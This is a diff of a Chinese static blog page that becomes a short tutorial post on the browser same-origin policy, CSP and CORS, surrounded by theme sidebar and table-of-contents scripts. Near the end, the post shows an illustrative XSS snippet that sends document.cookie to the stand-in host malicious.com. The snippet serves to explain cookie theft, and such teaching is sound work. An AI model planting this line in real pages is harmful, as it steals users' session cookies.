@@ -8,7 +8,7 @@
 <meta name="keywords" content="Gridea静态个人博客">
 <meta name="description" content="&lt;strong&gt;前端小白&lt;/strong&gt;">
 <meta name="theme-color" content="#000">
-<title>fanfan</title>
+<title>同源策略：为什么XMLHttpRequest不能跨域请求资源？ | fanfan</title>
 <link rel="shortcut icon" href="/favicon.ico?v=1631083807124">
 <link rel="stylesheet" href="/media/css/pisces.css">
 <link rel="stylesheet" href="/media/fonts/font-awesome.css">
@@ -41,6 +41,8 @@
 
 
 
+  <meta name="description" content="同源策略：为什么XMLHttpRequest不能跨域请求资源？" />
+  <meta name="keywords" content="浏览器,网络" />
 </head>
 
 <body>
@@ -212,10 +214,26 @@
   <div class="main-continer">
     
     <div
-      class="section-layout  pisces">
+      class="section-layout pisces ">
       <div class="section-layout-wrapper">
-        <div id="sidebarMeta" class="sidebar">
-    
+        
+
+<div class="sidebar">
+  
+    <div class="sidebar-box box-shadow-wrapper bg-color right-motion" id="sidebar">
+      
+        <div class="post-list-sidebar">
+          <div class="sidebar-title">
+            <span id="tocSideBar" class="sidebar-title-item sidebar-title-active language" data-lan="index">文章目录</span>
+            <span id="metaSideBar" class="sidebar-title-item language" data-lan="preview">站点概览</span>
+          </div>
+        </div>
+      
+      <div class="sidebar-body pisces" id="sidebar_body">
+        
+          
+            <div class="post-side-meta" id="post_side_meta">
+              
 <div class="sidebar-wrapper box-shadow-wrapper bg-color">
   <div class="sidebar-item">
     <img class="site-author-image right-motion" src="/images/avatar.png"/>
@@ -271,511 +289,423 @@
 
 
 </div>
+            </div>
+            <div class="post-toc sidebar-body-active" id="post_toc" style="opacity: 1;">
+              <div class="toc-box right-motion">
+  <div class="toc-wrapper auto-number auto"
+    id="toc_wrapper">
+    <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5">什么是同源策略</a>
+<ul>
+<li><a href="#%E7%AC%AC%E4%B8%80%E4%B8%AAdom%E5%B1%82%E9%9D%A2">第⼀个，DOM层⾯</a></li>
+<li><a href="#%E7%AC%AC%E4%BA%8C%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%B1%82%E9%9D%A2">第二个，数据层面</a></li>
+<li><a href="#%E7%AC%AC%E4%B8%89%E4%B8%AA%E7%BD%91%E7%BB%9C%E5%B1%82%E9%9D%A2">第三个，网络层面</a></li>
+</ul>
+</li>
+<li><a href="#%E5%AE%89%E5%85%A8%E5%92%8C%E4%BE%BF%E5%88%A9%E6%80%A7%E7%9A%84%E6%9D%83%E8%A1%A1">安全和便利性的权衡</a></li>
+</ul>
+</li>
+</ul>
+
+  </div>
 </div>
+
 <script>
-  let sidebarMeta = document.querySelector('#sidebarMeta');
-  let scheme = 'pisces';
-  let sidebarWrapper = document.querySelector('.sidebar-wrapper');
-  if (sidebarMeta && (scheme === 'pisces' || scheme === 'gemini')) {
-    document.addEventListener('scroll', function(e) {
-      if (document.scrollingElement.scrollTop > parseInt(sidebarMeta.style.marginTop) + 10) {
-        sidebarWrapper.classList.add('home-sidebar-fixed')
-      } else {
-        sidebarWrapper.classList.remove('home-sidebar-fixed')
+
+  let lastTop = 0, lList = [], hList = [], postBody, lastIndex = -1;
+  let active = 'active-show', activeClass = 'active-current';
+  let tocWrapper = document.querySelector('#toc_wrapper');
+  let tocContent = tocWrapper.children[0];
+  let autoNumber = tocWrapper && tocWrapper.classList.contains('auto-number');
+
+  function addTocNumber(elem, deep) {
+    if (!elem) {
+      return;
+    }
+    let prop = elem.__proto__;
+
+    if (prop === HTMLUListElement.prototype) {
+      for (let i = 0; i < elem.children.length; i++) {
+        addTocNumber(elem.children[i], deep + (i + 1) + '.');
       }
+    } else if (prop === HTMLLIElement.prototype) {
+      // 保存li元素
+      if (elem.children[0] && elem.children[0].__proto__ === HTMLAnchorElement.prototype) {
+        lList.push(elem);
+      }
+      for (let i = 0; i < elem.children.length; i++) {
+        let cur = elem.children[i];
+        if (cur.__proto__ === HTMLAnchorElement.prototype) {
+          if (autoNumber) {
+            cur.text = deep + ' ' + cur.text;
+          }
+        } else if (cur.__proto__ === HTMLUListElement.prototype) {
+          addTocNumber(cur, deep);
+        }
+      }
+    }
+  }
+
+  function removeParentActiveClass() {
+    let parents = tocContent.querySelectorAll('.' + active)
+    parents.forEach(function (elem) {
+      elem.classList.remove(active);
     });
   }
-  </script>
-        <div class="section-box tag-line box-shadow-wrapper">
-          <section class="section tags-section posts-expand bg-color">
-            <div class="padding-wrapper">
-  <div class="tag-timeline-box">
-    <div class="tag-timeline-wrapper">
-      <div class="tag-timeline-title">
-        <h2>
-          vue
-          <small class="language" data-lan="tag">标签</small>
-        </h2>
+
+  function addActiveClass(index) {
+    if (index >= 0 && index < hList.length) {
+      lList[index].classList.add(activeClass);
+    }
+  }
+
+  function removeActiveClass(index) {
+    if (index >= 0 && index < hList.length) {
+      lList[index].classList.remove(activeClass);
+    }
+  }
+
+  function addActiveLiElemment(elem, parent) {
+    if (!elem || elem === parent) {
+      return;
+    } else {
+      if (elem.__proto__ === HTMLLIElement.prototype) {
+        elem.classList.add(active);
+      }
+      addActiveLiElemment(elem.parentElement, parent);
+    }
+  }
+
+  function showToc() {
+    if (tocWrapper) {
+      postBody = document.querySelector('#post_body');
+      for (let i = 0; i < postBody.children.length; i++) {
+        if (postBody.children[i].__proto__ === HTMLHeadingElement.prototype) {
+          hList.push(postBody.children[i]);
+        }
+      }
+      if (tocWrapper.classList.contains('compress')) {
+        tocContent.classList.add('closed');
+      } else if (tocWrapper.classList.contains('no_compress')) {
+        tocContent.classList.add('expanded');
+      } else {
+        if (hList.length > 10) {
+          active = 'active-hidden'
+          tocContent.classList.add('closed');
+        } else {
+          tocContent.classList.add('expanded');
+        }
+      }
+    }
+  }
+
+  (function () {
+    // 处理不是从#一级标题开始目录
+    if (tocContent.children.length === 1 && tocContent.children[0].__proto__ === HTMLLIElement.prototype) {
+      let con = tocContent.children[0].children[0];
+      tocContent.innerHTML = con.innerHTML;
+    }
+    let markdownItTOC = document.querySelector('.markdownIt-TOC');
+    let innerHeight = window.innerHeight;
+    markdownItTOC.style = `max-height: ${innerHeight - 80 > 0 ? innerHeight - 80 : innerHeight}px`
+    addTocNumber(tocContent, '');
+  })();
+
+  document.addEventListener('scroll', function (e) {
+    if (lList.length <= 0) {
+      return;
+    }
+    let scrollTop = document.scrollingElement.scrollTop + 10;
+    let dir;
+
+    if (lastTop - scrollTop > 0) {
+      dir = 'up';
+    } else {
+      dir = 'down';
+    }
+
+    lastTop = scrollTop;
+    if (scrollTop <= 0) {
+      if (lastIndex >= 0 && lastIndex < hList.length) {
+        lList[lastIndex].classList.remove(activeClass);
+      }
+      return;
+    }
+
+    let current = 0, hasFind = false;
+    for (let i = 0; i < hList.length; i++) {
+      if (hList[i].offsetTop > scrollTop) {
+        current = i;
+        hasFind = true;
+        break;
+      }
+    }
+    if (!hasFind && scrollTop > lList[lList.length - 1].offsetTop) {
+      current = hList.length - 1;
+    } else {
+      current--;
+    }
+    if (dir === 'down') {
+      if (current > lastIndex) {
+        addActiveClass(current);
+        removeActiveClass(lastIndex)
+        lastIndex = current;
+        removeParentActiveClass();
+        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
+      }
+    } else {
+      if (current < lastIndex) {
+        addActiveClass(current);
+        removeActiveClass(lastIndex);
+        lastIndex = current;
+        removeParentActiveClass();
+        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
+      }
+    }
+  });
+
+
+  window.addEventListener('load', function () {
+    showToc();
+    document.querySelector('#sidebar').style = 'display: block;';
+    tocWrapper.classList.add('toc-active');
+    setTimeout(function () {
+      if ("createEvent" in document) {
+        let evt = document.createEvent("HTMLEvents");
+        evt.initEvent("scroll", false, true);
+        document.dispatchEvent(evt);
+      }
+      else {
+        document.fireEvent("scroll");
+      }
+    }, 500)
+  })
+
+</script>
+            </div>
+          
+        
       </div>
+    </div>
+  
+</div>
+<script>
+  const SIDEBAR_TITLE_ACTIVE = 'sidebar-title-active';
+  const SIDEBAR_BODY_ACTIVE = 'sidebar-body-active';
+  const SLIDE_UP_IN = 'slide-up-in';
+
+  let sidebar = document.querySelector('#sidebar'),
+  tocSideBar = document.querySelector('#tocSideBar'),
+  metaSideBar = document.querySelector('#metaSideBar'),
+  postToc = document.querySelector('#post_toc'),
+  postSiteMeta = document.querySelector('#post_side_meta'),
+  sidebarTitle = document.querySelector('.sidebar-title'),
+  sidebarBody = document.querySelector('#sidebar_body');
+
+  tocSideBar && tocSideBar.addEventListener('click', (e) => {
+    toggleSidebar(e);
+  });
+
+  metaSideBar && metaSideBar.addEventListener('click', (e) => {
+    toggleSidebar(e);
+  });
+
+  function toggleSidebar(e) {
+    let currentTitle = document.querySelector("."+SIDEBAR_TITLE_ACTIVE);
+    if (currentTitle == e.srcElement) {
+      return ;
+    }
+    let current, showElement, hideElement;
+    if (e.srcElement == metaSideBar) {
+      showElement = postSiteMeta;
+      hideElement = postToc;
+    } else if (e.srcElement == tocSideBar){
+      showElement = postToc;
+      hideElement = postSiteMeta;
+    }
+    currentTitle.classList.remove(SIDEBAR_TITLE_ACTIVE);
+    e.srcElement.classList.add(SIDEBAR_TITLE_ACTIVE);
+
+    jQuery.Velocity(hideElement, 'stop');
+    jQuery.Velocity(hideElement, 'transition.slideUpOut', {
+      display: 'none',
+      duration: 200,
+      complete: function () {
+        jQuery.Velocity(showElement, 'transition.slideDownIn', {
+          duration: 200
+        });
+      }
+    })
+    hideElement.classList.remove(SIDEBAR_BODY_ACTIVE);
+    showElement.classList.add(SIDEBAR_BODY_ACTIVE);
+  }
+
+  postToc && postToc.addEventListener('transitionend', function() {
+    this.classList.remove(SLIDE_UP_IN);
+  });
+
+  if (sidebarBody) {
+    if (sidebarBody.classList.contains('pisces') || sidebarBody.classList.contains('gemini')) {
+      let hasFix = false;
+      let scrollEl = document.querySelector('.main-continer');
+      let limitTop = document.querySelector('#nav_ul').children.length * 42 + 162;
+      window.addEventListener('scroll', function(e) {
+        if (document.scrollingElement.scrollTop >= limitTop) {
+          if (!hasFix) {
+            sidebar.classList.add('sidebar-fixed');
+            hasFix = true;
+          }
+        } else {
+          if (hasFix) {
+            sidebar.classList.remove('sidebar-fixed');
+            hasFix = false;
+          }
+        }
+      });
+    }
+  }
+  
+</script>
+        <div class="section-box box-shadow-wrapper">
+          <div class="section bg-color post post-page">
+            <section class="post-header">
+  <h1 class="post-title">
+    <a class="post-title-link" href="https://fanfankill.github.io/post/tong-yuan-ce-lue-wei-shi-me-xmlhttprequest-bu-neng-kua-yu-qing-qiu-zi-yuan/">
+      同源策略：为什么XMLHttpRequest不能跨域请求资源？
+    </a>
+  </h1>
+  <div class="post-meta">
+    
+    <span class="meta-item pc-show">
+      <i class="fa fa-calendar-o"></i>
+      <span class="language" data-lan="publish">发布于</span>
+      <span class="publish-time" data-t="2021-09-06 08:45:52">2021-09-06</span>
+      <span class="post-meta-divider pc-show">|</span>
+    </span>
+    
+    <span class="meta-item">
+      <i class="fa fa-folder-o"></i>
+      <span class="pc-show language" data-lan="category-in">分类于</span>
+      
+      
+      <a href="https://fanfankill.github.io/tag/68KZf8W4c/">
+        <span>浏览器</span>
+      </a>、
       
       
       
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      <a href="https://fanfankill.github.io/post/xu-ni-domxu-ni-dom-he-shi-ji-de-dom-you-he-bu-tong/">
-        <div class="motion-warpper">
-          <div class="tag-post-node">
-            <h1>
-              08-25
-              <small>虚拟DOM：虚拟DOM和实际的DOM有何不同？</small>
-            </h1>
-          </div>
-        </div>
+      <a href="https://fanfankill.github.io/tag/KATkWfQKE/">
+        <span>网络</span>
       </a>
       
       
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      <a href="https://fanfankill.github.io/post/vue-kai-fa-ui-zu-jian-ri-zhi-2/">
-        <div class="motion-warpper">
-          <div class="tag-post-node">
-            <h1>
-              08-16
-              <small>Vue开发ui组件日志2</small>
-            </h1>
-          </div>
-        </div>
-      </a>
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      <a href="https://fanfankill.github.io/post/vue-kai-fa-ui-zu-jian-ri-zhi/">
-        <div class="motion-warpper">
-          <div class="tag-post-node">
-            <h1>
-              08-10
-              <small>VUE开发UI组件日志</small>
-            </h1>
-          </div>
-        </div>
-      </a>
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      <a href="https://fanfankill.github.io/post/vue-wen-dang-cha-jian/">
-        <div class="motion-warpper">
-          <div class="tag-post-node">
-            <h1>
-              07-27
-              <small> Vue文档 插件</small>
-            </h1>
-          </div>
-        </div>
-      </a>
-      
-      
-      
-      
-      
-      
-      
-      <a href="https://fanfankill.github.io/post/a-li-yun-bu-shu-node-xiang-mu/">
-        <div class="motion-warpper">
-          <div class="tag-post-node">
-            <h1>
-              07-23
-              <small> 阿里云部署node项目</small>
-            </h1>
-          </div>
-        </div>
-      </a>
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      <a href="https://fanfankill.github.io/post/vue-wen-dang-4-cha-cao/">
-        <div class="motion-warpper">
-          <div class="tag-post-node">
-            <h1>
-              07-19
-              <small> Vue文档4 插槽</small>
-            </h1>
-          </div>
-        </div>
-      </a>
-      
-      
-      
-      
-      
-      <a href="https://fanfankill.github.io/post/vue-wen-dang-3/">
-        <div class="motion-warpper">
-          <div class="tag-post-node">
-            <h1>
-              07-18
-              <small> Vue文档3 Prop</small>
-            </h1>
-          </div>
-        </div>
-      </a>
-      
-      
-      
-      
-      
-      <a href="https://fanfankill.github.io/post/vue-wen-dang-2/">
-        <div class="motion-warpper">
-          <div class="tag-post-node">
-            <h1>
-              07-16
-              <small> Vue文档2 components</small>
-            </h1>
-          </div>
-        </div>
-      </a>
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      <a href="https://fanfankill.github.io/post/vue-router/">
-        <div class="motion-warpper">
-          <div class="tag-post-node">
-            <h1>
-              07-13
-              <small>vue-router</small>
-            </h1>
-          </div>
-        </div>
-      </a>
-      
-      
-      
-      
-      
-      <a href="https://fanfankill.github.io/post/vue-wen-dang/">
-        <div class="motion-warpper">
-          <div class="tag-post-node">
-            <h1>
-              07-11
-              <small>VUE文档 base</small>
-            </h1>
-          </div>
-        </div>
-      </a>
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      <a href="https://fanfankill.github.io/post/mustache/">
-        <div class="motion-warpper">
-          <div class="tag-post-node">
-            <h1>
-              06-26
-              <small>mustache</small>
-            </h1>
-          </div>
-        </div>
-      </a>
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      <a href="https://fanfankill.github.io/post/vue-qian-zhi-dao-hang-shou-wei/">
-        <div class="motion-warpper">
-          <div class="tag-post-node">
-            <h1>
-              04-07
-              <small>VUE 前置导航守卫</small>
-            </h1>
-          </div>
-        </div>
-      </a>
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
+    </span>
+    <span class="post-meta-divider">|</span>
+    
+    <span class="meta-item">
+      <i class="fa fa-clock-o"></i>
+      <span>3<span class="language" data-lan="minute">分钟</span></span>
+    </span>
+    <span class="meta-item">
+      <span class="post-meta-divider">|</span>
+      <i class="fa fa-file-word-o"></i>
+      <span>678<span class="pc-show language" data-lan="words">字数</span></span>
+    </span>
+    
+  </div>
+</section>
+            <div class="post-body next-md-body" id="post_body">
+              <p>浏览器安全可以分为三⼤块⸺<strong>Web⻚⾯安全、浏览器⽹络安全和浏览器系统安全</strong></p>
+<h2 id="什么是同源策略">什么是同源策略</h2>
+<p>如果两个URL的<strong>协议、域名和端⼝</strong>都相同，我们就称这两个URL同源。</p>
+<p>浏览器默认两个相同的源之间是可以相互访问资源和操作DOM的。两个不同的源之间若想要相互访问资源 或者操作DOM，那么会有⼀套基础的安全策略的制约，我们把这称为同源策略。</p>
+<p>具体来讲，同源策略主要表现在DOM、Web数据和⽹络这三个层⾯。</p>
+<br>
+<h3 id="第一个dom层面">第⼀个，DOM层⾯</h3>
+<p>同源策略限制了来⾃不同源的JavaScript脚本对当前DOM对象读和写的操作。</p>
+<figure data-type="image" tabindex="1"><img src="https://fanfankill.github.io/post-images/1630889177827.png" alt="" loading="lazy"></figure>
+<p>由于第⼀个⻚⾯和第⼆个⻚⾯是同源关系，所以我们可以在第⼆个⻚⾯中操作第⼀个⻚⾯的DOM，⽐如将 第⼀个⻚⾯全部隐藏掉，代码如下所⽰：</p>
+<pre><code class="language-js">{
+let pdom = opener.document
+pdom.body.style.display = &quot;none&quot;
+}
+
+</code></pre>
+<p>该代码中，对象opener就是指向第⼀个⻚⾯的window对象，我们可以通过操作opener来控制第⼀个⻚⾯ 中的DOM。</p>
+<p>我们在第⼆个⻚⾯的控制台中执⾏上⾯那段代码，就成功地操作了第⼀个⻚⾯中的DOM，将⻚⾯隐藏了</p>
+<p>在不同源的情况就会报跨域错误</p>
+<p><code>Blocked a frame with origin &quot;https://www.infoq.cn&quot; from accessing a cross-origin frame.</code></p>
+<br>
+<h3 id="第二个数据层面">第二个，数据层面</h3>
+<p>同源策略<strong>限制了不同源的站点读取当前站点的Cookie、IndexDB、LocalStorage等数据。</strong></p>
+<p>当同源的时候，第二个页面也无法通过opener去访问第一个页面的Cookie、indexDB等内容</p>
+<br>
+<h3 id="第三个网络层面">第三个，网络层面</h3>
+<p>同源策略限制了通过XMLHttpRequest等⽅式将站点的数据发送给不同源的站点。</p>
+<br>
+<h2 id="安全和便利性的权衡">安全和便利性的权衡</h2>
+<p>同源策略会隔离不同源的DOM、⻚⾯数据和⽹络通信，进⽽实现Web⻚⾯的安全性</p>
+<p>但同时带来了开发的不便和很多安全问题，最典型的是XSS攻击和CSRF攻击</p>
+<pre><code class="language-js">function onClick(){
+let url = `http://malicious.com?cookie = ${document.cookie}`
+open(url)
+}
+onClick()
+</code></pre>
+<p>在这段代码中，恶意脚本读取Cookie数据，并将其作为参数添加⾄恶意站点尾部，当打开该恶意⻚⾯时， 恶意服务器就能接收到当前⽤⼾的Cookie信息。</p>
+<p>为了解决XSS攻击，浏览器中引⼊了内容安全策略，称为CSP。<strong>CSP的 核⼼思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执⾏内联JavaScript代码</strong>。通过这些⼿段就可以⼤⼤减少XSS攻击。</p>
+<br>
+<p>后来引入<strong>CORS</strong>（跨域资源请求），使⽤该机制可以进⾏跨域访问控制，从⽽使跨域 数据传输得以安全进⾏</p>
+
+            </div>
+            
+            
+              <div class="post-footer">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong class="language" data-lan="author">本文作者：</strong>
+      fanfan
+    </li>
+    <li class="post-copyright-link">
+      <strong class="language" data-lan="link">本文链接：</strong>
+      <a href="https://fanfankill.github.io/post/tong-yuan-ce-lue-wei-shi-me-xmlhttprequest-bu-neng-kua-yu-qing-qiu-zi-yuan/" title="同源策略：为什么XMLHttpRequest不能跨域请求资源？">https://fanfankill.github.io/post/tong-yuan-ce-lue-wei-shi-me-xmlhttprequest-bu-neng-kua-yu-qing-qiu-zi-yuan/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong class="language" data-lan="copyright">版权声明： </strong>
+      本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i> BY-NC-SA</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+  <div class="tags">
+    
+      <a href="https://fanfankill.github.io/tag/68KZf8W4c/"># 浏览器</a>
+    
+      <a href="https://fanfankill.github.io/tag/KATkWfQKE/"># 网络</a>
+    
+  </div>
+  <div class="nav">
+    <div class="nav-prev">
+      
+        <i class="fa fa-chevron-left"></i>
+        <a class="nav-pc-next" title=" 跨站脚本攻击（XSS）：为什么Cookie中有HttpOnly属性？" href="https://fanfankill.github.io/post/kua-zhan-jiao-ben-gong-ji-xsswei-shi-me-cookie-zhong-you-httponly-shu-xing/"> 跨站脚本攻击（XSS）：为什么Cookie中有HttpOnly属性？</a class="nav-pc-next">
+        <a class="nav-mobile-prev" title=" 跨站脚本攻击（XSS）：为什么Cookie中有HttpOnly属性？" href="https://fanfankill.github.io/post/kua-zhan-jiao-ben-gong-ji-xsswei-shi-me-cookie-zhong-you-httponly-shu-xing/">上一篇</a>
+      
+    </div>
+    <div class="nav-next">
+      
+        <a class="nav-pc-next" title="JS实现`Object.create`、`Object.assign`" href="https://fanfankill.github.io/post/js-shi-xian-objectcreateobjectassign/">JS实现`Object.create`、`Object.assign`</a>
+        <a class="nav-mobile-next" title="JS实现`Object.create`、`Object.assign`" href="https://fanfankill.github.io/post/js-shi-xian-objectcreateobjectassign/">下一篇</a>
+        <i class="fa fa-chevron-right"></i>
       
     </div>
   </div>
 </div>
-          </section>
+            
+            
+  
+
+          </div>
         </div>
       </div>
     </div>
@@ -991,6 +921,223 @@
     aelem.appendChild(image);
     parent.insertBefore(aelem, next);
   })
+</script>
+
+    <div class="reward-mask" style="display: none;">
+  <div class="reward-relative">
+    <span class="close" aria-hidden="true">x</span>
+    <div class="reward-body">
+      <h2>感谢您的支持，我会继续努力的!</h2>
+      <div class="reward-img-box">
+        <div style="position: relative; width: 140px; height: 140px;">
+          
+          
+          
+        </div>
+      </div>
+      <p class="reward-word">扫码打赏，你说多少就多少</p>
+      <p class="reward-tip">打开微信扫一扫，即可进行扫码打赏哦</p>
+    </div>
+    <div class="bottom">
+      
+      
+    </div>
+  </div>
+</div>
+<style>
+  .reward-mask {
+    position: fixed;
+    z-index: 99999;
+    top: 0;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    background-color: #00000054;
+  }
+
+  .reward-relative {
+    position: relative;
+    width: 480px;
+    text-align: center;
+    margin: 0 auto;
+    border-radius: 5px;
+    background-color: #fff;
+    top: 50%;
+    margin-top: -205px;
+  }
+
+  .reward-relative .close {
+    position: absolute;
+    right: 10px;
+    font-weight: normal;
+    font-size: 16px;
+    color: #929292;
+  }
+
+  .reward-body {
+    padding: 40px 20px 20px;
+  }
+
+  .bottom {
+    display: flex;
+  }
+
+  .reward-btn {
+    text-align: center;
+  }
+
+  .reward-btn-text {
+    display: inline-block;
+    cursor: pointer;
+    width: 60px;
+    height: 60px;
+    line-height: 60px;
+    border-radius: 50%;
+    background-color: #ff9734;
+    color: #FFF;
+    margin-top: 20px;
+  }
+
+  .pay-text {
+    margin-top: 10px;
+    padding: 10px;
+    flex: 1;
+    transition: all .2s linear;
+  }
+
+  .pay-text:hover {
+    background-color: #a5a5a536;
+  }
+
+  .reward-body h2 {
+    padding-top: 10px;
+    text-align: center;
+    color: #a3a3a3;
+    font-size: 16px;
+    font-weight: normal;
+    margin: 0 0 20px;
+  }
+
+  .reward-body h2:after,
+  .reward-body h2:before {
+    font-family: Arial, Helvetica, sans-serif;
+    background: 0 0;
+    width: 0;
+    height: 0;
+    font-style: normal;
+    color: #eee;
+    font-size: 80px;
+    position: absolute;
+    top: 20px;
+  }
+
+  .reward-body h2:before {
+    content: '\201c';
+    left: 50px;
+  }
+
+  .reward-body h2:after {
+    content: '\201d';
+    right: 80px;
+  }
+
+  .reward-img-box {
+    display: inline-block;
+    padding: 10px;
+    border: 6px solid #ea5f00;
+    margin: 0 auto;
+    border-radius: 3px;
+    position: relative;
+  }
+
+  .reward-img {
+    position: absolute;
+    left: 0px;
+    top: 0px;
+    width: 100%;
+    height: 100%;
+  }
+
+  @media (max-width: 767px) {
+    .reward-relative {
+      height: 100%;
+      top: 0px;
+      margin-top: 0;
+      width: auto;
+    }
+
+    .reward-relative .bottom {
+      flex-direction: column;
+    }
+
+    .reward-relative .pay-text {
+      width: 80%;
+      margin: 5px auto;
+      border: 1px solid silver;
+      padding: 6px;
+      border-radius: 4px;
+    }
+
+    .reward-body h2:after {
+      right: 40px;
+    }
+
+    .reward-body h2:after,
+    .reward-body h2:before {
+      font-size: 60px;
+    }
+
+    .reward-body h2:before {
+      left: 20px;
+    }
+  }
+</style>
+<script>
+  !function () {
+    var mask = document.querySelector('.reward-mask');
+    let close = document.querySelector('.reward-relative .close');
+    let rewardBtn = document.querySelector('.reward-btn');
+
+    let zfb = document.querySelector('#zfb'),
+      wx = document.querySelector('#wx'),
+      zfbBtn = document.querySelector('#zfbBtn'),
+      wxBtn = document.querySelector('#wxBtn');
+
+    if (zfbBtn && wxBtn) {
+      zfbBtn.addEventListener('click', () => {
+        jQuery.Velocity(zfb, 'transition.slideLeftIn', {
+          duration: 400
+        });
+        jQuery.Velocity(wx, 'transition.slideRightOut', {
+          display: 'none',
+          duration: 400
+        });
+      });
+
+      wxBtn.addEventListener('click', () => {
+        jQuery.Velocity(wx, 'transition.slideRightIn', {
+          duration: 400
+        });
+        jQuery.Velocity(zfb, 'transition.slideLeftOut', {
+          display: 'none',
+          duration: 400
+        });
+      });
+    }
+
+    rewardBtn.addEventListener('click', (e) => {
+      jQuery.Velocity(mask, 'transition.slideDownIn', {
+        duration: 400
+      })
+    });
+
+    close.addEventListener('click', (e) => {
+      e.preventDefault();
+      jQuery.Velocity(mask, 'transition.slideUpOut', {
+        duration: 400
+      })
+    })
+  }()
 </script>
 
   </div>
@@ -12299,7 +12446,6 @@ sdsd&lt;br&gt;
 
 
 <script src="/media/js/cool.js"></script>
-
 
 
 
